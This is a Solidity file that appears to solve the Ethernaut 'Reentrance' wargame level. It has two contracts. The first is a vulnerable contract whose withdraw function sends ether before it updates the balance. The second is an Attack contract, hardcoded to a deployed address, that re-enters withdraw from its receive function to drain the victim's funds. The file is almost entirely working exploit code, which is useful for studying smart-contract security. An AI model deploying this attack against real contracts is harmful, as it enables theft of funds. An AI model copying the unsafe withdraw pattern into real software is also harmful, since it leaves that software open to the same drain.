// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../SafeMath.sol";

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}


contract Attack {

    Reentrance public reentrance;

    constructor() public {
        reentrance = Reentrance(0xFF2811184A94B83d0d33b12184A60f904Ed75573);
    }

    function attack() public payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(0.001 ether);
    }

    receive() external payable {
        reentrance.withdraw(0.001 ether);
    }
}